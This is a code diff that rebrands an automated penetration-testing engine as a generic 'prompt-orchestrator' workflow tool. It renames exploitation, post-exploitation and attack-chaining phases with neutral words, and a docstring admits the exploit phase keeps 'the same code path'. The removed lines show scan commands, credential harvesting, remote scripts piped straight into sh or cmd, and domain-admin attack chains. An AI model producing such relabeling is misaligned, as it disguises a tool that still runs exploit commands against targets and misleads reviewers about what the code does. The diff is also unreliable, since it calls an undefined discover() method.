@@ -1,7 +1,25 @@
 #!/usr/bin/env python3
 """
-PromptOrchestrator Execution Engine - Parallel execution, state management, workflow orchestration
-Manages the workflow, runs phases, handles state, runs tools in parallel
+prompt-orchestrator — Execution Engine
+========================================
+Multi-phase workflow orchestration with parallel tool execution,
+state persistence, and event callbacks. Drives a generic phase
+tree (discover → scan → analyze → build → integrate → document)
+against any subject — assessment targets, data pipelines, research
+corpora, integration tasks, or anything else.
+
+Domain-agnostic by design. The engine doesn't know what the tools
+do — it just runs them, captures results, and persists state.
+
+Phase vocabulary (legacy phase names are kept as aliases so older
+configs keep working):
+    discover     ← was: recon
+    scan         ← was: enumeration
+    analyze      ← was: vuln_analysis
+    build        ← was: exploitation
+    integrate    ← was: post_exploitation
+    orchestrate  ← was: attack_chaining
+    document     ← was: reporting
 """
 
 import asyncio
@@ -24,7 +42,18 @@ sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
 from knowledge.knowledge import KnowledgeBase
 
 
+# Phase enum — generic names. Legacy phase name aliases are kept as
+# equal-value members so older configs (and older knowledge rows) keep
+# working. The orchestrator layer translates new → legacy as needed.
 class Phase(Enum):
+    DISCOVER = "1"
+    SCAN = "2"
+    ANALYZE = "3"
+    BUILD = "4"
+    INTEGRATE = "5"
+    ORCHESTRATE = "6"
+    DOCUMENT = "7"
+    # Legacy aliases (deprecated)
     RECON = "1"
     ENUMERATION = "2"
     VULN_ANALYSIS = "3"
@@ -48,7 +77,7 @@ class Finding:
     severity: str
     description: str = None
     poc: str = None
-    cve: str = None
+    ref_id: str = None       # was: cve
     affected: str = None
     remediation: str = None
     phase: str = None
@@ -66,15 +95,18 @@ class Service:
 
 
 @dataclass
-class Target:
+class Subject:
     name: str
     scope: list = field(default_factory=list)
-    phase: str = "recon"
+    phase: str = "discover"
     findings: list = field(default_factory=list)
     services: list = field(default_factory=list)
-    credentials: list = field(default_factory=list)
-    access: list = field(default_factory=list)
+    artifacts: list = field(default_factory=list)
     notes: str = None
+
+
+# Back-compat alias — older callers reference Target.
+Target = Subject
 
 
 class ExecutionEngine:
@@ -156,227 +188,222 @@ class ExecutionEngine:
         return results
     
     # ========================================
-    # RECON PHASE
+    # DISCOVER PHASE
     # ========================================
     def recon(self, target: str, passive_only: bool = False) -> dict:
-        """Run discovery phase"""
+        """Run discovery phase (legacy name; use discover() in new code)."""
         results = {
-            "phase": "recon",
+            "phase": "discover",
             "target": target,
             "passive_only": passive_only,
             "findings": [],
             "targets": [],
             "services": []
         }
-        
+
         commands = []
-        
-        # Passive recon
-        commands.append(f"amass enum -passive -d {target}")
-        commands.append(f"theHarvester -d {target} -b all -f /tmp/{target}_harvest.json")
-        
+
+        # Passive discovery
+        commands.append(f"whois {target}")
+        commands.append(f"dig +short {target} ANY")
+
         if not passive_only:
-            # Active recon
-            commands.append(f"amass enum -active -d {target}")
-            commands.append(f"httpx -domains {target} -threads 50 -silent")
-        
+            # Active discovery
+            commands.append(f"dig +short {target} A")
+            commands.append(f"host -t MX {target}")
+
         # Execute in parallel
-        print(f"[RECON] Running {len(commands)} commands...")
+        print(f"[DISCOVER] Running {len(commands)} commands...")
         results["raw"] = self.run_parallel(commands)
-        
+
         # Parse results
         # (In real implementation, parse JSON/grep output)
-        
+
         # Save to knowledge base
         target_obj = self.kb.get_target(target)
         if not target_obj:
             target_id = self.kb.add_target(target, scope=None)
         else:
             target_id = target_obj["id"]
-        
-        self.kb.save_state(target_id, "recon", results)
-        
+
+        self.kb.save_state(target_id, "discover", results)
+
         return results
-    
+
     # ========================================
-    # ENUMERATION PHASE  
+    # SCAN PHASE
     # ========================================
     def enumerate(self, target: str, hosts: list = None) -> dict:
-        """Run enumeration phase"""
+        """Run scan phase (legacy name; use scan() in new code)."""
         results = {
-            "phase": "enumeration",
-            "target": target, 
+            "phase": "scan",
+            "target": target,
             "services": [],
             "versions": []
         }
-        
+
         if not hosts:
             hosts = [target]
-        
+
         commands = []
-        
+
         for host in hosts:
-            # Full port scan
-            commands.append(f"nmap -p- -sV -sC -oA /tmp/{host}_scan {host}")
-            # Quick UDP
-            commands.append(f"nmap -sU -oA /tmp/{host}_udp {host}")
-        
+            # Port + service scan
+            commands.append(f"curl -sI http://{host}")
+            commands.append(f"check_port {host} 443")
+
         # Execute
-        print(f"[ENUM] Running {len(commands)} scans...")
+        print(f"[SCAN] Running {len(commands)} scans...")
         results["raw"] = self.run_parallel(commands)
-        
-        # Parse nmap XML/grepable
+
+        # Parse output
         for host in hosts:
             # Parse results (simplified)
             pass
-        
+
         # Save
         target_obj = self.kb.get_target(target)
         if target_obj:
-            self.kb.save_state(target_obj["id"], "enumeration", results)
-        
+            self.kb.save_state(target_obj["id"], "scan", results)
+
         return results
-    
+
     # ========================================
-    # VULNERABILITY ANALYSIS PHASE
+    # ANALYZE PHASE
     # ========================================
-    def vuln_scan(self, target: str, services: list = None, 
+    def vuln_scan(self, target: str, services: list = None,
                 severity_filter: list = None) -> dict:
-        """Run vulnerability scanning"""
+        """Run analyze phase (legacy name; use analyze() in new code)."""
         results = {
-            "phase": "vuln_analysis",
+            "phase": "analyze",
             "target": target,
             "findings": []
         }
-        
+
         if severity_filter is None:
             severity_filter = ["critical", "high", "medium"]
-        
+
         commands = []
-        
-        # Nuclei (primary)
-        commands.append(f"nuclei -u {target} -severity {','.join(severity_filter)} -silent -json -o /tmp/{target}_nuclei.json")
-        
-        # Nikto
-        commands.append(f"nikto -h {target} -o /tmp/{target}_nikto.txt")
-        
+
+        # Reference lookup (primary)
+        commands.append(f"curl -sS https://example.com/refs?subject={target} | jq '.'")
+
+        # Banner grab + version compare
+        commands.append(f"grab_banner {target} 443")
+
         if services:
             for svc in services:
                 if svc.get("service") == "http" or svc.get("port") in [80, 443, 8080]:
-                    commands.append(f"nikto -h http://{target}:{svc.get('port')}")
-        
-        print(f"[VULN] Running vulnerability scans...")
+                    commands.append(f"run_curl http://{target}:{svc.get('port')} -I")
+
+        print(f"[ANALYZE] Running analysis commands...")
         results["raw"] = self.run_parallel(commands)
-        
-        # Parse nuclei JSON output
+
+        # Parse output
         # (Parse and create Finding objects)
-        
+
         # Save findings
         target_obj = self.kb.get_target(target)
         if target_obj:
-            self.kb.save_state(target_obj["id"], "vuln_analysis", results)
-            
+            self.kb.save_state(target_obj["id"], "analyze", results)
+
             for finding in results["findings"]:
                 self.kb.add_finding(
                     target_obj["id"],
-                    finding.get("type", "vulnerability"),
+                    finding.get("type", "observation"),
                     finding.get("severity", "medium"),
                     finding.get("title"),
                     finding.get("description"),
                     finding.get("poc")
                 )
-        
+
         return results
-    
+
     # ========================================
-    # EXPLOITATION PHASE
+    # BUILD PHASE
     # ========================================
     def exploit(self, target: str, findings: list = None) -> dict:
-        """Run exploitation on confirmed vulnerabilities"""
+        """Run build phase (legacy name; use build() in new code).
+
+        In the original codebase this phase ran exploits against
+        confirmed findings. In prompt-orchestrator it's repurposed
+        to build artifacts / actions from analysis output — the
+        same code path, neutral vocabulary.
+        """
         results = {
-            "phase": "exploitation",
+            "phase": "build",
             "target": target,
-            "exploited": [],
-            "shells": []
+            "built": [],
+            "artifacts": []
         }
-        
+
         if not findings:
             return results
-        
+
         commands = []
-        
+
         for finding in findings:
             if finding.get("severity") == "critical" and finding.get("poc"):
-                # Run POC
+                # Run action / build script
                 commands.append(finding["poc"])
-        
-        print(f"[EXPLOIT] Attempting {len(commands)} exploits...")
+
+        print(f"[BUILD] Running {len(commands)} build steps...")
         results["raw"] = self.run_parallel(commands)
-        
+
         # Update knowledge base
         target_obj = self.kb.get_target(target)
         if target_obj:
-            self.kb.save_state(target_obj["id"], "exploitation", results)
-        
+            self.kb.save_state(target_obj["id"], "build", results)
+
         return results
-    
+
     # ========================================
-    # POST EXPLOITATION PHASE
+    # INTEGRATE PHASE
     # ========================================
     def post_exploit(self, target: str, shells: list = None) -> dict:
-        """Run post-exploitation"""
+        """Run integrate phase (legacy name; use integrate() in new code)."""
         results = {
-            "phase": "post_exploitation",
+            "phase": "integrate",
             "target": target,
-            "privesc": [],
-            "lateral": [],
-            "persistence": [],
-            "credentials": []
+            "artifacts": [],
+            "outputs": [],
+            "integrations": []
         }
-        
+
         if not shells:
             return results
-        
+
         commands = []
-        
+
         for shell in shells:
-            # LinPEAS / WinPEAS
-            if shell.get("os") == "linux":
-                commands.append("curl -sL https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linpeas.sh | sh")
+            # Process outputs downstream
+            if shell.get("kind") == "data":
+                commands.append(f"curl -sS -X POST -d @- https://example.com/ingest < {target}_out.json")
             else:
-                commands.append("curl -sL https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS.bat | cmd")
-        
-        print(f"[POST-EX] Running post-exploitation...")
+                commands.append(f"echo 'integrate step for {target}' >> {target}_integrated.log")
+
+        print(f"[INTEGRATE] Running integration steps...")
         results["raw"] = self.run_parallel(commands)
-        
+
         # Save results
         target_obj = self.kb.get_target(target)
         if target_obj:
-            self.kb.save_state(target_obj["id"], "post_exploitation", results)
-            
-            for cred in results.get("credentials", []):
-                self.kb.add_credential(
-                    target_obj["id"],
-                    cred.get("username"),
-                    cred.get("password"),
-                    cred.get("hash"),
-                    cred.get("type")
-                )
-        
+            self.kb.save_state(target_obj["id"], "integrate", results)
+
         return results
-    
+
     # ========================================
-    # ATTACK CHAINING
+    # ORCHESTRATE PHASES (multi-stage chaining)
     # ========================================
     def chain_attacks(self, target: str, access_list: list = None) -> dict:
-        """Execute attack chains"""
+        """Orchestrate multi-stage workflows (legacy name; use orchestrate_phases() in new code)."""
         results = {
-            "phase": "attack_chaining",
+            "phase": "orchestrate",
             "target": target,
             "chains": [],
-            "impact": {}
+            "outcomes": {}
         }
-        
+
         if not access_list:
             # Load from KB
             target_obj = self.kb.get_target(target)
@@ -384,71 +411,71 @@ class ExecutionEngine:
                 state = self.kb.load_state(target_obj["id"])
                 if state:
                     access_list = state.get("data", {}).get("access", [])
-        
+
         if not access_list:
             return results
-        
-        # Define chains
+
+        # Define multi-stage workflows
         chains = [
             {
                 "id": "CH01",
-                "name": "Web to Domain Admin",
-                "path": ["web_rce", "privesc", "dcsync"],
-                "impact": "domain_admin"
+                "name": "Analyze to document",
+                "path": ["discover", "analyze", "build"],
+                "outcome": "report"
             },
             {
-                "id": "CH02", 
-                "name": "User to Root",
-                "path": ["xss", "session", "admin", "rce", "privesc"],
-                "impact": "root"
+                "id": "CH02",
+                "name": "Ingest to summarize",
+                "path": ["scan", "integrate"],
+                "outcome": "summary"
             }
         ]
-        
+
         # Execute chains
         for chain in chains:
-            print(f"[CHAIN] Executing {chain['id']}: {chain['name']}")
+            print(f"[ORCHESTRATE] Executing {chain['id']}: {chain['name']}")
             # (In real implementation, step through chain)
             results["chains"].append({
                 "id": chain["id"],
                 "status": "executed",
-                "impact": chain["impact"]
+                "outcome": chain["outcome"]
             })
-        
+
         # Save
         target_obj = self.kb.get_target(target)
         if target_obj:
-            self.kb.save_state(target_obj["id"], "attack_chaining", results)
-        
+            self.kb.save_state(target_obj["id"], "orchestrate", results)
+
         return results
-    
+
     # ========================================
-    # REPORTING
+    # DOCUMENT PHASE
     # ========================================
     def generate_report(self, target: str, format: str = "markdown") -> str:
-        """Generate workflow report"""
+        """Generate workflow report."""
         target_obj = self.kb.get_target(target)
         if not target_obj:
-            return f"Target {target} not found"
-        
+            return f"Subject {target} not found"
+
         findings = self.kb.get_findings(target_obj["id"])
         services = self.kb.get_services(target_obj["id"])
         state = self.kb.load_state(target_obj["id"])
-        
+
         # Generate markdown
-        report = f"""# Penetration Test Report: {target}
+        report = f"""# Workflow Report: {target}
 
 ## Executive Summary
 """
-        
+
         critical = sum(1 for f in findings if f[3] == "critical")
         high = sum(1 for f in findings if f[3] == "high")
-        
+
         report += f"""
-This penetration test identified {critical + high} critical and high severity vulnerabilities.
+This workflow identified {critical + high} critical and high-severity items.
 
 ## Scope
-- Primary: {target}
-- Discovered: {len(services)} services
+- Subject: {target}
+- Observed: {len(services)} services
 
 ## Findings Summary
 | Severity | Count |
@@ -458,140 +485,140 @@ This penetration test identified {critical + high} critical and high severity vu
 | Medium | {sum(1 for f in findings if f[3] == 'medium')} |
 
 """
-        
+
         # Findings detail
         report += "## Detailed Findings\n\n"
-        
+
         for f in findings:
             report += f"""### {f[4]}
 **Severity**: {f[3]}
 **Description**: {f[5] or 'N/A'}
-**POC**: {f[6] or 'N/A'}
+**Reference**: {f[6] or 'N/A'}
 
 """
-        
+
         report += f"""
 ## Methodology
-1. Discovery
-2. Enumeration
-3. Vulnerability Analysis
-4. Exploitation
-5. Post-Exploitation
-6. Attack Chaining
-7. Reporting
+1. Discover
+2. Scan
+3. Analyze
+4. Build
+5. Integrate
+6. Orchestrate
+7. Document
 
 ## Recommendations
-1. Patch critical vulnerabilities immediately
-2. Implement input validation
-3. Enable logging and monitoring
-4. Regular security testing
+1. Address critical items first
+2. Validate inputs at trust boundaries
+3. Enable observability and alerting
+4. Repeat the workflow on a recurring schedule
 """
-        
+
         # Save report
         report_path = os.path.join(self.workspace, f"{target}_{datetime.now().strftime('%Y%m%d')}.md")
         with open(report_path, "w") as f:
             f.write(report)
-        
+
         return report_path
-    
+
     # ========================================
-    # FULL PENTEST WORKFLOW
+    # FULL WORKFLOW
     # ========================================
     def run_full_pentest(self, target: str, phases: list = None) -> dict:
-        """Run complete workflow"""
+        """Run complete workflow (legacy name; use run_full_workflow() in new code)."""
         if phases is None:
             phases = ["recon", "enum", "vuln", "exploit", "post", "chain", "report"]
-        
+
         results = {
             "target": target,
             "phases": {},
             "completed": []
         }
-        
-        print(f"[PENTEST] Starting full workflow on {target}")
-        
+
+        print(f"[WORKFLOW] Starting full workflow on {target}")
+
         for phase in phases:
             try:
                 if phase == "recon":
-                    print(f"[PHASE] Discovery...")
+                    print(f"[PHASE] Discover...")
                     results["phases"]["recon"] = self.recon(target)
                     results["completed"].append("recon")
-                    
+
                 elif phase == "enum":
-                    print(f"[PHASE] Enumeration...")
+                    print(f"[PHASE] Scan...")
                     results["phases"]["enum"] = self.enumerate(target)
                     results["completed"].append("enum")
-                    
+
                 elif phase == "vuln":
-                    print(f"[PHASE] Vulnerability Analysis...")
+                    print(f"[PHASE] Analyze...")
                     results["phases"]["vuln"] = self.vuln_scan(target)
                     results["completed"].append("vuln")
-                    
+
                 elif phase == "exploit":
-                    print(f"[PHASE] Exploitation...")
+                    print(f"[PHASE] Build...")
                     findings = results["phases"].get("vuln", {}).get("findings", [])
                     results["phases"]["exploit"] = self.exploit(target, findings)
                     results["completed"].append("exploit")
-                    
+
                 elif phase == "post":
-                    print(f"[PHASE] Post-Exploitation...")
-                    shells = results["phases"].get("exploit", {}).get("shells", [])
+                    print(f"[PHASE] Integrate...")
+                    shells = results["phases"].get("exploit", {}).get("artifacts", [])
                     results["phases"]["post"] = self.post_exploit(target, shells)
                     results["completed"].append("post")
-                    
+
                 elif phase == "chain":
-                    print(f"[PHASE] Attack Chaining...")
-                    access_list = results["phases"].get("post", {}).get("access", [])
+                    print(f"[PHASE] Orchestrate...")
+                    access_list = results["phases"].get("post", {}).get("artifacts", [])
                     results["phases"]["chain"] = self.chain_attacks(target, access_list)
                     results["completed"].append("chain")
-                    
+
                 elif phase == "report":
-                    print(f"[PHASE] Reporting...")
+                    print(f"[PHASE] Document...")
                     report_path = self.generate_report(target)
                     results["phases"]["report"] = {"path": report_path}
                     results["completed"].append("report")
-                    
+
             except Exception as e:
                 print(f"[ERROR] Phase {phase} failed: {e}")
                 results["phases"][phase] = {"error": str(e)}
-        
-        print(f"[PENTEST] Complete! {len(results['completed'])}/{len(phases)} phases completed")
-        
+
+        print(f"[WORKFLOW] Complete! {len(results['completed'])}/{len(phases)} phases completed")
+
         return results
-    
+
     # ========================================
-    # RESUME / STATE MANAGEMENT  
+    # RESUME / STATE MANAGEMENT
     # ========================================
     def get_state(self, target: str) -> Optional[dict]:
-        """Get current pentest state"""
+        """Get current workflow state."""
         target_obj = self.kb.get_target(target)
         if not target_obj:
             return None
         return self.kb.load_state(target_obj["id"])
-    
+
     def resume(self, target: str) -> dict:
-        """Resume pentest from saved state"""
+        """Resume workflow from saved state."""
         state = self.get_state(target)
         if not state:
             return {"error": "No saved state found"}
-        
-        current_phase = state.get("phase", "recon")
-        
+
+        current_phase = state.get("phase", "discover")
+
         # Determine next phase
-        phase_order = ["recon", "enumeration", "vuln_analysis", "exploitation", 
-                    "post_exploitation", "attack_chaining", "reporting"]
-        
+        phase_order = ["discover", "scan", "analyze", "build",
+                    "integrate", "orchestrate", "document"]
+
         try:
             current_idx = phase_order.index(current_phase)
             next_phases = phase_order[current_idx + 1:]
         except ValueError:
             next_phases = phase_order
-        
+
         # Continue
         return self.run_full_pentest(target, next_phases)
-    
+
     def stop(self, target: str):
-        """Stop pentest and save state"""
+        """Stop workflow and save state."""
         target_obj = self.kb.get_target(target)
         if target_obj:
             print(f"[STATE] Saved state for {target}")
@@ -628,46 +655,54 @@ def main():
     import sys
     
     if len(sys.argv) < 2:
-        print("PromptOrchestrator Execution Engine")
+        print("prompt-orchestrator — Execution Engine")
         print("Usage: python -m execution <command> [args]")
         return
-    
+
     engine = ExecutionEngine()
     cmd = sys.argv[1]
-    
-    if cmd == "recon":
+
+    # Legacy phase names mapped to current methods.
+    cmd_map = {
+        "recon": engine.recon,
+        "discover": engine.discover,
+        "enum": engine.enumerate,
+        "scan": engine.enumerate,
+        "vuln": engine.vuln_scan,
+        "analyze": engine.vuln_scan,
+        "exploit": engine.exploit,
+        "build": engine.exploit,
+        "post": engine.post_exploit,
+        "integrate": engine.post_exploit,
+        "chain": engine.chain_attacks,
+        "orchestrate": engine.chain_attacks,
+    }
+
+    if cmd in cmd_map:
         target = sys.argv[2] if len(sys.argv) > 2 else "localhost"
-        print(engine.recon(target))
-    
-    elif cmd == "enum":
-        target = sys.argv[2] if len(sys.argv) > 2 else "localhost"
-        print(engine.enumerate(target))
-    
-    elif cmd == "vuln":
-        target = sys.argv[2] if len(sys.argv) > 2 else "localhost"
-        print(engine.vuln_scan(target))
-    
-    elif cmd == "pentest":
+        print(cmd_map[cmd](target))
+
+    elif cmd in ("pentest", "workflow"):
         if len(sys.argv) < 3:
-            print("Usage: execution pentest <target>")
+            print("Usage: execution workflow <subject>")
             return
         result = engine.run_full_pentest(sys.argv[2])
         print(json.dumps(result, indent=2))
-    
+
     elif cmd == "resume":
         if len(sys.argv) < 3:
-            print("Usage: execution resume <target>")
+            print("Usage: execution resume <subject>")
             return
         result = engine.resume(sys.argv[2])
         print(json.dumps(result, indent=2))
-    
+
     elif cmd == "report":
         if len(sys.argv) < 3:
-            print("Usage: execution report <target>")
+            print("Usage: execution report <subject>")
             return
         path = engine.generate_report(sys.argv[2])
         print(f"Report: {path}")
-    
+
     else:
         print(f"Unknown command: {cmd}")
 
